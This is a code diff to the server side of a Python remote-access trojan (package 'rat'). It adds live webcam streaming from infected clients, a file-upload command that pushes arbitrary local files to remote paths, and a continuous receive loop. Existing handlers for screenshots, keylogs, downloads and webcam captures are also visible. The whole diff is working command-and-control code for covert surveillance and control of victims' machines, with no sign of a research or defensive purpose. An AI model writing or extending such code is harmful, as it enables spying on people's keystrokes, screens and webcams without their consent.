@@ -1,16 +1,13 @@
-# écouter sur un port
-# accepter connexions
-# lancer threads
 import socket
 import ssl
 import json
 import datetime
-import time
 import base64
 from threading import Thread
 from rat.utils.logger import setup_logger
-from rat.server._build_upload_payload import _build_upload_payload
 from rat.server.sessions import SessionManager
+import cv2
+import numpy as np
 
 logger = setup_logger()
 
@@ -29,6 +26,8 @@ class SSLServer:
         self._context.load_cert_chain(server_cert, server_key)
         self._context.load_verify_locations(client_cert)
         self._sessions = SessionManager()
+        self._latest_frame = None
+        self._stream_active = False
 
     def shutdown(self):
         logger.info("Shutdown requested")
@@ -195,6 +194,48 @@ class SSLServer:
 
             print("Webcam save error:", e)
 
+    def _display_stream(self, response):
+
+        try:
+            lines = response.split("\n")
+
+            if len(lines) < 3:
+                return
+
+            encoded = "".join(lines[2:]).strip()
+            if not encoded:
+                return
+
+            image_bytes = base64.b64decode(encoded)
+
+            np_arr = np.frombuffer(image_bytes, dtype=np.uint8)
+
+            frame = cv2.imdecode(np_arr, cv2.IMREAD_COLOR)
+
+            if frame is None:
+                return
+
+            # ✅ STORE ONLY
+            self._latest_frame = frame
+            self._stream_active = True
+
+        except Exception:
+            pass
+
+    def run_stream_display(self):
+
+        while self._running:
+
+            if self._stream_active and self._latest_frame is not None:
+
+                cv2.imshow("Webcam Stream", self._latest_frame)
+
+                if cv2.waitKey(1) & 0xFF == ord("q"):
+                    break
+
+            else:
+                cv2.waitKey(50)
+
     def _handle_response(self, response):
         lines = response.split("\n")
         response_type = lines[0]
@@ -212,11 +253,21 @@ class SSLServer:
             print("\n".join(lines))
         elif response_type == "WEBCAM":
             self._save_webcam(response)
+        elif response_type == "WEBCAM_STREAM":
+            self._display_stream(response)
         else:
             print(response)
 
         # Logging
-        if response_type in ("SCREENSHOT", "DOWNLOAD", "KEYLOG", "UPLOAD", "WEBCAM"):
+        if response_type in (
+            "SCREENSHOT",
+            "DOWNLOAD",
+            "KEYLOG",
+            "UPLOAD",
+            "WEBCAM",
+            "WEBCAM_STREAM",
+            "FRAME",
+        ):
             logger.info("Client responded with %s", response_type)
         else:
             logger.info("Client responded: %s", response)
@@ -247,53 +298,90 @@ class SSLServer:
         else:
             print("Session not found")
 
+    def _build_upload_payload(self, local_path, remote_path):
+
+        import base64
+
+        with open(local_path, "rb") as f:
+            data = f.read()
+
+        encoded = base64.b64encode(data).decode()
+
+        return f"{remote_path}\n{encoded}"
+
     # ------------- Sending commands (incorporates upload) -------------
     def _send_to_active_session(self, command):
+
         session = self._sessions.get_active()
+
         if not session:
             print("No active session. Use 'sessions' then 'use <id>'")
             return
 
         sock = session.sock
+
         try:
-            # If it's an upload command, build the payload and send exactly that
+
+            # 🔥 SPECIAL CASE UPLOAD
             if command.startswith("upload "):
-                payload = _build_upload_payload(command)
-                if payload.startswith("ERROR"):
-                    print(payload)
+
+                parts = command.split()
+
+                if len(parts) != 3:
+                    print("Usage: upload <local_path> <remote_path>")
                     return
-                self._send_message(sock, payload)
+
+                local_path = parts[1]
+                remote_path = parts[2]
+
+                payload = self._build_upload_payload(local_path, remote_path)
+
+                full_command = f"upload {payload}"
+
             else:
-                self._send_message(sock, command)
+                full_command = command
 
-            logger.info("Command sent to session %s: %s", session.id, command)
+            data = full_command.encode()
 
-            response = self._recv_message(sock)
-            if not response:
-                print("Client disconnected")
-                self._sessions.remove_session(session.id)
-                return
+            size = str(len(data)).encode() + b"\n"
 
-            self._handle_response(response)
+            sock.sendall(size)
+            sock.sendall(data)
+
+            logger.info("Command sent: %s", command)
 
         except Exception as e:
             print("Send error:", e)
 
     # ------------- Client monitor thread (kept minimal) -------------
     def _handle_client(self, session):
+
+        sock = session.sock
+
         logger.info("Session %s handler started", session.id)
+
         try:
+
             while self._running:
-                if session.sock.fileno() == -1:
+
+                response = self._recv_message(sock)
+
+                if not response:
                     break
-                time.sleep(1)  # just keep the thread alive until disconnect
+
+                self._handle_response(response)
+
+        except Exception as e:
+
+            logger.error("Session %s error: %s", session.id, e)
+
         finally:
+
             logger.info("Session %s disconnected", session.id)
+
             self._sessions.remove_session(session.id)
-            try:
-                session.sock.close()
-            except Exception:
-                pass
+
+            sock.close()
 
     def _handle_kill(self, command):
 
